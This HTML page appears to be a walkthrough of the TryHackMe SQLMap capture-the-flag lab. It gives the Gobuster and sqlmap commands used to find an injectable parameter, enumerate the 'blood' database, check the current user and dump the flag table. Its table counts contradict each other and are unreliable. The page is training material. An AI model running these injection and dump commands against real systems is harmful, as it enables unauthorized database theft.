<body>
    <h1>SQLMap Lab Walkthrough</h1>
    <h2>Introduction</h2>
    <p>This guide will walk you through the TryHackMe SQLMap lab, teaching you how to use SQLMap to find and exploit SQL injection vulnerabilities. Ensure you have access to TryHackMe and the necessary tools installed (OpenVPN, Burp Suite, and Gobuster).</p>
    <h2>Prerequisites</h2>
    <ul>
        <li><strong>TryHackMe Account:</strong> Ensure you have an account on TryHackMe.</li>
        <li><strong>OpenVPN:</strong> Install and configure OpenVPN to connect to TryHackMe servers.</li>
        <li><strong>Burp Suite:</strong> Install Burp Suite for intercepting web traffic.</li>
        <li><strong>Gobuster:</strong> Install Gobuster for directory enumeration.</li>
        <li><strong>SQLMap:</strong> Install SQLMap for SQL injection testing.</li>
    </ul>
    <h2>Steps</h2>
    <ol>
        <li><strong>Connect to TryHackMe</strong>
            <p>Download the VPN configuration file from TryHackMe and connect using OpenVPN:</p>
            <pre><code>sudo openvpn --config your-vpn-config.ovpn</code></pre>
        </li>
        <li><strong>Access the SQLMap Challenge</strong>
            <p>Open a web browser and go to the IP address provided after starting the machine on TryHackMe.</p>
            <p>You will see an nginx web server.</p>
        </li>
        <li><strong>Identify the Vulnerable Parameter</strong>
            <p><strong>Using Burp Suite:</strong></p>
            <ul>
                <li>Open Burp Suite and set up the proxy to intercept the web traffic.</li>
                <li>Intercept a request from the nginx web server.</li>
                <li>Save the intercepted request to a text file (e.g., <code>request.txt</code>).</li>
            </ul>
            <p><strong>Using Gobuster:</strong></p>
            <ul>
                <li>Open a terminal and use Gobuster to enumerate directories:</li>
                <pre><code>gobuster dir -u http://&lt;IP_ADDRESS&gt; -w /path/to/wordlist -t 30</code></pre>
                <li>Note the vulnerable parameter found (e.g., <code>blood_group</code>).</li>
            </ul>
        </li>
        <li><strong>Run SQLMap</strong>
            <p>Open a terminal and run SQLMap using the saved request file:</p>
            <pre><code>sqlmap -r request.txt -p blood_group --dbs</code></pre>
            <p>SQLMap will enumerate the databases and list them. You will find that there are 6 tables in the <code>blood</code> database.</p>
        </li>
        <li><strong>Enumerate the Blood Database</strong>
            <p>Further enumerate the <code>blood</code> database to find its tables:</p>
            <pre><code>sqlmap -r request.txt -D blood --tables</code></pre>
            <p>SQLMap will list 3 tables.</p>
        </li>
        <li><strong>Enumerate the Users Table</strong>
            <p>Target the <code>users</code> table to find more information:</p>
            <pre><code>sqlmap -r request.txt -D blood -T users --current-user</code></pre>
            <p>SQLMap will reveal that the current user is <code>root</code>.</p>
        </li>
        <li><strong>Dump the Flag Table</strong>
            <p>Finally, enumerate the <code>flag</code> table to obtain the flag:</p>
            <pre><code>sqlmap -r request.txt -D blood -T flag --dump-all</code></pre>
            <p>SQLMap will dump the contents of the <code>flag</code> table, revealing the flag needed to complete the room.</p>
        </li>
    </ol>
    <h2>Conclusion</h2>
    <p>By following these steps, you can successfully use SQLMap to exploit SQL injection vulnerabilities in the TryHackMe SQLMap lab. Remember to replace placeholder values with actual data from your lab environment.</p>
</body>
</html>
